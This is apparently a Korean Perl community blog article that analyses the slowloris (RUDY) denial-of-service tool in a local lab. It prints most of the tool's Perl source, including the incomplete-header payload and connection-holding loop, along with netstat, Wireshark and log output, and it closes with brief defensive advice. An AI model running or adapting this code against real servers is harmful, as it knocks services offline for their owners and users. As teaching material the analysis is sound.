@@ -1,0 +1,521 @@
+Title:    RUDY slowloris
+Package:  Seoul.pm
+Category: perl
+Category: Seoul.pm
+Author:   newbcode
+
+## 저자
+
+[@newbcode][author] - 사랑스런 딸바보 도치파파
+
+## 시작하며
+
+R-U-DEAD-YET(RUDY). 아직 죽지 않았니? 마치 관리자를 조롱하는 듯한 공격 이름입니다.
+RUDY를 시작하기전에 대략 DOS의 역사를 집어보면 2000년초 아마존,
+E-Bay를 시작으로 DDOS는 세상에 알려지게 됩니다.
+이때만 해도 네트워크 인프라가 없었기 때문에 대량의 좀비봇과 원격서버로 공격을 감행했습니다.
+그리고 또 하나의 특징으로는 실력 행사용 공격 양상을 보였지만
+2005년도를 넘어 오면서 일정한 타겟을 두고 금품 갈취를 목적으로 DDOS 공격이 시행됐습니다.
+주로 타겟은 불법게임사이트, 전자상거래 사이트 등이 타겟이 되었습니다.
+그리고 2009년 7.7대란이 일어나게 되고 이제부터는 국가간 사이버전쟁 시대를 암시하듯 국가 기간망과
+포털, 정부 등을 노리게 됩니다.
+즉 실제로 Fire Sale이 진행되는 양상을 보입니다.
+Fire Sale은 국가 전체 구조에 대한 체계화된 3단계 공격입니다.
+
+- 1단계는 모든 교통체계를 무너트리고 모든 재정과 주요 통신망을 마비 혹은 장악합니다 .
+- 2단계는 이후, 가스, 수도, 전기, 원자력 등 모든 공공시설물에대한 통제 권한을 뺏는 것입니다.
+- 3단계는 그 나라를 무력으로 초토화하는 것입니다.
+
+1단계가 바로 2009년 7.7대란과 흡사합니다.
+이처럼 DDOS 공격은 대담해지고 고도화되고 있는 시점에서 RUDY 공격은 중요한 전환점이 됩니다.
+기존의 DDOS 공격은 좀비 PC를 이용해 세션 L7에서 대량 트랙픽을 유발하는 방식의 공격이었습니다.
+그래서 어플리케이션 방화벽으로 패턴을 잡아내서 방어를 하였습니다.
+하지만 RUDY는 패턴이 없기 때문에 사실상 막거나 눈치채기 어렵습니다.
+가장 큰 차이점은 트래픽이 비정상으로 많아지는 것이 아니라 서서히
+세션을 늘려감으로써 서버의 리소스를 서서히 좀 먹는 것입니다.
+결국 max session이 되면 서버는 die 상태가 됩니다.
+
+서론이 너무 길었습니다.
+이제 RUDY 공격 중 Perl로 짜여진 slowloris 공격 소스를 보고
+관리자의 시점이 아니라 순수한? 마음으로 분석을 진행해보겠습니다.
+
+본론으로 들어가기전 slowloris의 특징을 보겠습니다.
+
+- HTTP GET 기반 Flooding입니다.
+- 공격 PC는 달랑 1대면 됩니다.
+- 아주 정상적인 세션을 가집니다.
+- 공격이 끝나기 전까지는 로그를 남기지 않습니다.
+- 공격 대상은 서서히 말라 죽습니다.
+- 타겟이 아파치 서버의 아키텍쳐 자체에 있습니다. 그러므로 방어가 까다롭습니다.
+
+위에 내용을 기억하시면서 보시면 더 재밌을 것 같습니다.
+
+
+## 실험 환경
+
+시나리오를 위한 환경은 아래와 같습니다.
+
+- 타겟 서버: CentOS 6.3 (현재 redhat 최신 배포판) 
+- 공격자 PC: Linux Mint nadia 14 (현재 distrowatch 1위 배포판)
+- 네트워크 프로토콜 분석기: Wireshark 1.8.4
+
+공격 시나리오와 테스트 환경은 순수 로컬망에서 실험하였습니다. 
+혹여 의심을 받을 만한 행동은 삼가합시다.
+
+
+## 준비물
+
+필요한 모듈은 아래 3개면 충분합니다.
+
+- [IO::Socket::INET][module-inet]
+- [IO::Socket::SSL][module-ssl]
+- [Devel::Trace::More][module-trace] - host, get, cache 등의 값을 보기 위한 trace 모듈
+
+아래와 같이 직접 설치합니다.
+
+    #!bash
+    $ sudo cpan IO::Socket::INET IO::Socket::SSL Devel::Trace::More
+
+## 본격적으로
+
+설치가 완료되면 본격적으로 소스를 보겠습니다. 
+크게 Input, Setting, Attack으로 나누어 소스를 보겠습니다.
+실질적으로 Wireshark로 패킷을 실시간으로 분석하여 소스 부분과 매치하며 보도록 하겠습니다.
+
+공격소스를 보기전에 일반적인 패턴을 보겠습니다.
+아래와 같이 일반적인 HTTP Connection은 `syn->syn`, `ack->ack->push->fin->fin,ack`를 함으로서 접속을 마칩니다.
+`ack`후 `get`을 할 때 클라이언트는 아래와 같이 `0d0a0d0a`를 보냄으로써 종료됩니다.
+또한 이 때 Wireshark와 서버의 상태를 살펴보겠습니다.
+
+![img][]
+
+netstat로 보는 서버의 상태입니다.
+아래와 같이 하나의 세션이 ESTABLISHED 상태 입니다.
+
+    #!bash
+    [root@centos63 ~]# netstat -atn
+    Active Internet connections (servers and established)
+    Proto Recv-Q Send-Q Local Address     Foreign Address      State     
+    tcp        0      0 0.0.0.0:111       0.0.0.0:*            LISTEN     
+    tcp        0      0 0.0.0.0:54289     0.0.0.0:*            LISTEN     
+    tcp        0      0 0.0.0.0:22        0.0.0.0:*            LISTEN     
+    tcp        0      0 127.0.0.1:631     0.0.0.0:*            LISTEN     
+    tcp        0      0 127.0.0.1:25      0.0.0.0:*            LISTEN     
+    tcp        0     52 192.168.25.33:22  192.168.25.10:51723  ESTABLISHED
+    tcp        0      0 :::33645          :::*                 LISTEN     
+    tcp        0      0 :::111            :::*                 LISTEN     
+    tcp        0      0 :::80             :::*                 LISTEN     
+    tcp        0      0 :::22             :::*                 LISTEN     
+    tcp        0      0 ::1:631           :::*                 LISTEN     
+    tcp        0      0 ::1:25            :::*                 LISTEN     
+    tcp        0      0 :::443            :::*                 LISTEN  
+
+코드를 봅시다.
+먼저 모듈을 로드하고 `Getopt::Long`을 통해 명령행 인자로 옵션을 받습니다.
+
+    #!perl
+    #!/usr/bin/perl -w
+    use strict;
+    use IO::Socket::INET;
+    use IO::Socket::SSL;
+    use Getopt::Long;
+    use Config;
+    use Devel::Trace::More;
+    
+    # Attack 대상의 정보를 입력하는 부분입니다.
+    my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections );
+    my ( $cache, $httpready, $method, $ssl, $rand, $tcpto );
+    my $result = GetOptions(
+        'shost=s'   => \$shost,
+        'dns=s'     => \$host,
+        'httpready' => \$httpready,
+        'num=i'     => \$connections,
+        'cache'     => \$cache,
+        'port=i'    => \$port,
+        'https'     => \$ssl,
+        'tcpto=i'   => \$tcpto,
+        'test'      => \$test,
+        'timeout=i' => \$timeout,
+        'version'   => \$version,
+    );
+    
+    # 아래는 각종 옵션과 사용법에 대한 부분입니다.
+    
+    if ($version) {
+        print "Version 0.7\n";
+        exit;
+    }
+    
+    unless ($host) {
+        print "Usage:\n\n\tperl $0 -dns [www.example.com] -options\n";
+        print "\n\tType 'perldoc $0' for help with options.\n\n";
+        exit;
+    }
+    
+    unless ($port) {
+        $port = 80;
+        print "Defaulting to port 80.\n";
+    }
+    
+    unless ($tcpto) {
+        $tcpto = 5;
+        print "Defaulting to a 5 second tcp connection timeout.\n";
+    }
+    
+    unless ($test) {
+        unless ($timeout) {
+            $timeout = 100;
+            print "Defaulting to a 100 second re-try timeout.\n";
+        }
+        unless ($connections) {
+            $connections = 1000;
+            print "Defaulting to 1000 connections.\n";
+        }
+    }
+
+받은 옵션을 처리하여 아래와 같이 몇몇 공격을 위한 설정을 합니다.
+
+    #!perl
+    # 현재 설치된 펄이 쓰레드를 지원할 경우 쓰레드를 사용합니다.
+    my $usemultithreading = 0; 
+    if ( $Config{usethreads} ) {
+        print "Multithreading enabled.\n";
+        $usemultithreading = 1;
+        use threads;
+        use threads::shared;
+    }
+    else {
+        print "No multithreading capabilites found!\n";
+        print "Slowloris will be slower than normal as a result.\n";
+    }
+    
+    # 패킷 카운트, 세션을 마크하여 공유 함
+    # 같은세션으로 연결할 경우 WAF 패턴에 잡히지 않도록 하는 설정
+    my $packetcount     : shared = 0;
+    my $failed          : shared = 0;
+    my $connectioncount : shared = 0;
+    
+    # 캐시를 랜덤으로 생성하여 서버에 no-store옵션을
+    # 역이용하여 cache를 계속 생성하게 하도록 합니다.
+    srand() if ($cache);
+    
+    # 공격자의 호스트와 HTTP 요청 방식을 설정합니다.
+    $sendhost = $shost     ? $shost : $host;
+    $method   = $httpready ? "POST" : "GET";
+
+이제부터 옵션을 설정하고 실질적으로 공격하는 부분을 봅니다.
+세션을 늘리면서 테스트를 진행합니다.
+
+    #!perl
+    if ($test) {
+        my @times = ( "2", "30", "90", "240", "500" );
+        my $totaltime = 0;
+        foreach (@times) {
+            $totaltime = $totaltime + $_;
+        }
+        $totaltime = $totaltime / 60;
+        print "This test could take up to $totaltime minutes.\n";
+    
+        my $delay   = 0;
+        my $working = 0;
+        my $sock;
+        ...
+    }
+    
+위 부분의 동작을 실제 Wireshark를 이용해 보도록 하겠습니다.
+공격을 시도하는 동시에 제 노트북이 팬소리가 급증하네요.
+아래와 같이 클라이언트에서 정상적인 syc패킷을 보낸 후
+서버에서 SYN\_ACK가 오고난 후 ACK를 보낼 때 완전하지 않은 헤더를 보내게 됩니다. (`0d0a`만 보내게 됩니다.)
+그래서 서버는 마지막 `0d0a`를 기다리게됩니다.
+payload를 살펴보면 GET을 시도한 후 브라우저 정보를 보내고
+실제 payload contents length값이 42바이트지만 헤더는 40바이트만 보내는 것을 알 수 있습니다.
+
+![img][]
+
+클라이언트에서 40바이트만 보내는걸 확인 할 수 있습니다. 하지만 실제 payload는 42바이트 입니다.
+header length : 40 bytes
+
+![img][]
+
+Slowloris가 실핼될 때 서버 세션의 변화 모습입니다.
+정상적인 SYN을 받음으로 서버는 ESTABLISHED 상태로 연결을 맺고
+
+    #!bash
+    [root@centos63 ~]# netstat -atn
+    Active Internet connections (servers and established)
+    Proto Recv-Q Send-Q Local Address               Foreign Address             State     
+    tcp        0      0 0.0.0.0:111                 0.0.0.0:*                   LISTEN     
+    tcp        0      0 192.168.25.33:80            192.168.25.29:36119         SYN_RECV   
+    tcp        0      0 192.168.25.33:80            192.168.25.29:36136         SYN_RECV   
+    tcp        0      0 192.168.25.33:80            192.168.25.29:36121         SYN_RECV   
+    tcp        0      0 192.168.25.33:80            192.168.25.29:36113         SYN_RECV   
+    tcp        0      0 192.168.25.33:80            192.168.25.29:36118         SYN_RECV
+    ...
+    tcp        0     52 192.168.25.33:22            192.168.25.10:51723         ESTABLISHED
+    tcp      230      0 ::ffff:192.168.25.33:80     ::ffff:192.168.25.29:36027  ESTABLISHED
+    tcp        0      0 ::ffff:192.168.25.33:80     ::ffff:192.168.25.29:35952  ESTABLISHED
+    tcp        0      0 ::ffff:192.168.25.33:80     ::ffff:192.168.25.29:35874  ESTABLISHED
+    tcp      230      0 ::ffff:192.168.25.33:80     ::ffff:192.168.25.29:36116  ESTABLISHED
+    tcp        0      0 ::ffff:192.168.25.33:80     ::ffff:192.168.25.29:35988  ESTABLISHED
+    tcp        0      0 ::ffff:192.168.25.33:80     ::ffff:192.168.25.29:35876  ESTABLISHED
+    tcp        0      0 ::ffff:192.168.25.33:80     ::ffff:192.168.25.29:36004  ESTABLISHED
+    tcp      230      0 ::ffff:192.168.25.33:80     ::ffff:192.168.25.29:36094  ESTABLISHED
+    ...
+
+바로 접속된 세션들은 synack 패킷을 받기위해
+SYN\_RECV 상태로 빠진후 FIN\_WAIT 상태로 바뀌게 됩니다.
+
+    #!bash
+    [root@centos63 ~]# netstat -atn
+    Active Internet connections (servers and established)
+    Proto Recv-Q Send-Q Local Address     Foreign Address      State     
+    tcp        0      0 0.0.0.0:111       0.0.0.0:*            LISTEN     
+    tcp        0      0 192.168.25.33:80  192.168.25.29:36990  SYN_RECV   
+    tcp        0      0 192.168.25.33:80  192.168.25.29:37176  SYN_RECV   
+    tcp        0      0 192.168.25.33:80  192.168.25.29:37103  SYN_RECV   
+    tcp        0      0 192.168.25.33:80  192.168.25.29:37127  SYN_RECV   
+    tcp        0      0 192.168.25.33:80  192.168.25.29:37022  SYN_RECV   
+    tcp        0      0 192.168.25.33:80  192.168.25.29:36906  SYN_RECV   
+    tcp        0      0 192.168.25.33:80  192.168.25.29:37141  SYN_RECV   
+    tcp        0      0 192.168.25.33:80  192.168.25.29:37086  SYN_RECV   
+    tcp        0      0 192.168.25.33:80  192.168.25.29:36999  SYN_RECV   
+    tcp        0      0 192.168.25.33:80  192.168.25.29:37108  SYN_RECV   
+    tcp        0      0 192.168.25.33:80  192.168.25.29:37073  SYN_RECV   
+    tcp        0      0 192.168.25.33:80  192.168.25.29:37220  SYN_RECV   
+    tcp        0      0 192.168.25.33:80  192.168.25.29:36964  SYN_RECV
+    ....
+
+30초 후 http 세션의 갯수입니다. 엄청나게 늘어났습니다. 현재 저 세션은 OPEN 상태입니다.
+세션이 다시 줄어드는 이유는 공격을 한 후 다시 세션을 회수하기 때문입니다.
+관리자가 눈치채지 못하게 말이죠.
+
+    #!bash
+    [root@centos63 ~]# netstat -atn |wc -l
+    173
+    [root@centos63 ~]# netstat -atn |wc -l
+    177
+    [root@centos63 ~]# netstat -atn |wc -l
+    202
+    [root@centos63 ~]# netstat -atn |wc -l
+    232
+    [root@centos63 ~]# netstat -atn |wc -l
+    449
+    [root@centos63 ~]# netstat -atn |wc -l
+    647
+    [root@centos63 ~]# netstat -atn |wc -l
+    639
+    [root@centos63 ~]# netstat -atn |wc -l
+    475
+
+다시 코드로 돌아가겠습니다.
+소켓을 생성합니다. HTTP와 동일하여 패킷은 생략합니다.
+SSL과 INET의 경우를 구분하였습니다.
+
+    #!perl
+    if ($ssl) {
+        $sock = IO::Socket::SSL->new(
+            PeerAddr => $host,
+            PeerPort => $port,
+            Timeout  => $tcpto,
+            Proto    => "tcp"
+        );
+        $working = 1 if $sock;
+    }
+    else {
+        $sock = IO::Socket::INET->new(
+            PeerAddr => $host,
+            PeerPort => $port,
+            Timeout  => $tcpto,
+            Proto    => "tcp",
+        );
+        $working = 1 if $sock;
+    }
+
+이어서 실제로 세션수를 정의 하는 부분이다.
+서버의 No-Store 캐시 옵션을 역이용 하여 캐시를 생성하도록 부하를 주게됩니다.
+
+    #!perl
+    if ($working) {
+        if ($cache) {
+            $rand = "?" . int rand(99999999999999);
+        }
+        else {
+            $rand = "";
+        }
+        # 아래에 계속..
+        
+이번에는 세션수를 정의하고 브라우저의 정보를 GET 합니다.
+정상적인 SYN 패킷을 보내기 위한 부분입니다.
+
+![img][]
+
+    #!perl
+    # if ($working) {
+        # 위에서 계속..
+        
+        my $primarypayload =
+            "GET /$rand HTTP/1.1\r\n"
+          . "Host: $sendhost\r\n"
+          . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; "
+          . "Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR "
+          . "3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
+          . "Content-Length: 42\r\n";
+    
+        if (print $sock $primarypayload) {
+            print "Connection successful, now comes the waiting game...\n";
+        }
+        else {
+            print "That's odd - ";
+            print "I connected but couldn't send the data to $host:$port.\n";
+            print "Is something wrong?\nDying.\n";
+            exit;
+        }
+    }
+    else {
+        print "Uhm... I can't connect to $host:$port.\n";
+        print "Is something wrong?\nDying.\n";
+        exit;
+    }
+
+소켓을 생성한 후 그 소켓은 SLEEP 상태에 빠지며 서버측의 응답을 기다리게 됩니다.
+클라이언트는 마지막 `0d0a`를 보내지 않습니다.
+
+    #!perl
+    for ( my $i = 0 ; $i <= $#times ; $i++ ) {
+        print "Trying a $times[$i] second delay: \n";
+        sleep( $times[$i] );
+        if ( print $sock "X-a: b\r\n" ) { # 0d0a를 한번만 보냅니다.
+            print "\tWorked.\n";
+            $delay = $times[$i];
+        }
+        else {
+            if ( $SIG{__WARN__} ) {
+                $delay = $times[ $i - 1 ];
+                last;
+            }
+            print "\tFailed after $times[$i] seconds.\n";
+        }
+    }
+    
+이때 서버의 상태를 확인합시다.
+기본으로 20개의 소켓을 생성, 20개의 쓰레드를 만들고 그 후 계속해서 패킷을 보내게 됩니다.
+물론 정상적인 패킷은 아닙니다. OPEN된 연결을 유지하기위한 완전하지 않는 패킷이죠.
+
+    #!plain
+    Connecting to 192.168.25.33:80 every 100 seconds with 1000 sockets:
+              Building sockets.
+              Building sockets.
+              Building sockets.
+              Building sockets.
+              ....
+              ....
+              Sending data.
+    Current stats:     Slowloris has now sent 679 packets successfully.
+    This thread now sleeping for 100 seconds...
+
+              Sending data.
+    Current stats:     Slowloris has now sent 733 packets successfully.
+    This thread now sleeping for 100 seconds...
+    
+              Sending data.
+    Current stats:     Slowloris has now sent 798 packets successfully.
+    This thread now sleeping for 100 seconds...
+              ....
+              ....
+
+이제부터 `timewait` 설정에 따라 세션을 회수합니다.
+이래야 관리자가 눈치채지 못하겠죠.
+이 시점에서 공격을 멈추지 않는 한 접속 로그는 볼 수 없습니다.
+이에 대해서는 마지막 부분에서 다루겠습니다.
+
+    #!perl
+    # if ($test) {
+    #   ....
+    # 
+        if ( print $sock "Connection: Close\r\n\r\n" ) {
+            print "Okay that's enough time. Slowloris closed the socket.\n";
+            print "Use $delay seconds for -timeout.\n";
+            exit;
+        }
+        else {
+            print "Remote server closed socket.\n";
+            print "Use $delay seconds for -timeout.\n";
+            exit;
+        }
+        if ( $delay < 166 ) {
+            print <<EOSUCKS2BU;
+Since the timeout ended up being so small ($delay seconds) and it generally
+takes between 200-500 threads for most servers and assuming any latency at
+all...  you might have trouble using Slowloris against this target.  You can
+tweak the -timeout flag down to less than 10 seconds but it still may not
+build the sockets in time.
+EOSUCKS2BU
+        }
+    }
+
+여기까지가 `-test` 옵션을 주었을 경우 `timeout` 값을 찾기 위한 실험 공격이었습니다.
+`-test` 옵션 대신 `-timeout`과 `-connections` 설정을 부여하였을 경우
+`doconnections()` 사용자 함수를 통해 공격을 시도합니다.
+
+    #!perl
+    else {
+        print "Connecting to $host:$port every";
+        print $timeout seconds with $connections sockets:\n";
+    
+        if ($usemultithreading) {
+            domultithreading($connections);
+        }
+        else {
+            doconnections( $connections, $usemultithreading );
+        }
+    }
+
+`doconnections()`는 지금까지 본 로직과 거의 동일하지만,
+미리 정해진 연결의 개수와 timeout 시간에 대해 작동합니다.
+쓰레드를 사용하게 되면 `domultithreading()`을 호출하고 `doconnections()` 함수를
+다수의 쓰레드를 통해 실행합니다.
+
+## 로그가 정말 남지 않을까?
+
+아래는 공격을 시도하고 있지만 로그가 남지 않는 모습입니다.
+
+    #!bash
+    [root@centos63 httpd]# tail -f access_log
+    ::1 - - [16/Dec/2012:05:21:01 -0500] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.2.15 (CentOS) (internal dummy connection)"
+    ::1 - - [16/Dec/2012:05:21:02 -0500] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.2.15 (CentOS) (internal dummy connection)"
+    ::1 - - [16/Dec/2012:05:21:03 -0500] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.2.15 (CentOS) (internal dummy connection)"
+    ::1 - - [16/Dec/2012:05:21:04 -0500] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.2.15 (CentOS) (internal dummy connection)"
+    ::1 - - [16/Dec/2012:05:21:05 -0500] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.2.15 (CentOS) (internal dummy connection)"
+    ...
+    
+공격을 멈춰 보겠습니다.
+멈춤과 동시에 로그가 생성되는 것을 볼 수 있습니다.
+
+    #!plain
+    192.168.25.29 - - [16/Dec/2012:05:21:55 -0500] "GET / HTTP/1.1" 400 305 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;
+    Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)"
+    192.168.25.29 - - [16/Dec/2012:05:21:55 -0500] "GET / HTTP/1.1" 400 305 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;
+    Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)"
+    192.168.25.29 - - [16/Dec/2012:05:21:55 -0500] "GET / HTTP/1.1" 400 305 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;
+    Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)"
+    ...
+    
+## 정리하며
+
+Perl은 이처럼 여러 분야에서 활약하고 있습니다.
+더 많은 기능과 옵션이 있지만 아주 기본적인 DNS 기반의 공격만 분석해 보았습니다.
+7.7대란때 사용되었던 DOS, DDOS는 RUDY 공격의 테스트였다고 보고 있습니다.
+`doconnection()`을 이용하여 헤더 대신 커맨드와 같은 것들도 쓸 수 있을 것입니다.
+현재 봇에게 RUDY의 소스를 심어서 공격한다면 ARP 플루딩같은 효과가 나오지 않을까 생각합니다.
+그러면 IP 교체나 장비 교체같은 방법을 쓰지 않는 한 힘들 것 같습니다.
+완전한 보안이란 어려운 일이며 많은 노력이 필요합니다.
+이 기사를 보는 관리자 분들이 계시다면 스노트 룰이나 iptables 또는 WAF의 룰을 한 번 만들어
+보시는 것은 어떨까요?
+공격 뿐만 아니라 펄의 강력한 PCRE와 자동화 기능을 활용하여 더 멋진 봇을 만들 수 있지 않을까요?
+Perl IRC를 지켜주는 봇 같은 것도 가능하겠네요.. :-)
+
+
+[author]: https://twitter.com/newbcode
+[module-inet]: https://www.metacpan.org/module/IO::Socket::INET
+[module-ssl]: https://www.metacpan.org/module/IO::Socket::SSL
+[module-trace]: https://www.metacpan.org/module/Devel::Trace::More
